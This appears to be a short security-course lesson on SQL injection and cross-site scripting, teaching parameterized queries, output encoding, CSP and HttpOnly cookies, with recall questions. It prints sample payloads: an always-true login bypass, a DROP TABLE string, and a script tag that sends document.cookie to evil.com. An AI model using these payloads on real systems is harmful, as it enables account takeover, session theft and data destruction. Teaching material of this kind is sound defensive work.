---
id: sec-injection
chapter: sec-webvuln
title: Injection: SQL injection and XSS
minutes: 6
---
Injection attacks all share one root cause: **untrusted input is treated as code instead of data**. Two dominate the OWASP Top 10.

**SQL injection (SQLi)** — user input is concatenated into a SQL query, so the input can *change the query*. If the login query is built as:

```
"SELECT * FROM users WHERE name = '" + input + "'"
```

then an input of `' OR '1'='1` turns the WHERE clause always-true and logs the attacker in; `'; DROP TABLE users; --` can destroy data. The **standard mitigation is parameterized queries (prepared statements)**: the query structure is fixed and sent separately from the values, so input can never be parsed as SQL. Use them everywhere; an ORM does this for you. Add least-privilege DB accounts and input validation as defense in depth, but parameterization is the fix — string escaping by hand is not.

**Cross-Site Scripting (XSS)** — the attacker injects script that runs in *another user's* browser, in the victim's session. Example (**stored XSS**): an attacker posts a comment containing `<script>fetch('evil.com?c='+document.cookie)</script>`; every user who views the comment ships their session cookie to the attacker. Variants: **stored** (saved in your DB), **reflected** (echoed back from a URL parameter), and **DOM-based** (client-side JS writes untrusted data into the page).

The mitigation is **context-aware output encoding**: escape data for the context it lands in (HTML, attribute, JS, URL) so `<script>` renders as text, not code. Modern frameworks (React, Angular) auto-escape by default — the danger is escape hatches like `dangerouslySetInnerHTML`. Reinforce with a **Content Security Policy (CSP)** that blocks inline scripts, and set session cookies `HttpOnly` so script can't read them.

The unifying lesson: **separate code from data** — bind values as parameters (SQLi), encode output for its context (XSS) — and never trust input because it came through your own UI.

```flow
dir: LR
input: Untrusted input | actor
sink: Sink | gate
sql: SQL query | store
param: Parameterize | step
page: Rendered page | step
encode: Encode output | step
victim: Victim browser | actor
input -> sink : data or code
sink -> sql : query path
sql -> param : bind values
sink -> page : output path
page -> encode : escape for context
encode -> victim : renders as text
```

```recall
Q: Why do parameterized queries stop SQL injection where manual escaping does not?
A: The query structure is fixed and sent separately from the values, so input can never be parsed as SQL. Hand-escaping is error-prone and misses cases.
Q: What is the root cause shared by SQLi and XSS?
A: Untrusted input is treated as code instead of data. The fixes both re-separate the two: bind values as parameters, encode output for its context.
Q: Why does setting session cookies HttpOnly help against XSS?
A: Script injected into the page cannot read an HttpOnly cookie, so even a successful XSS cannot exfiltrate the session cookie via document.cookie.
Q: When is a framework like React still vulnerable to XSS?
A: When you use an escape hatch such as dangerouslySetInnerHTML that bypasses the auto-escaping, injecting raw untrusted HTML into the page.
```
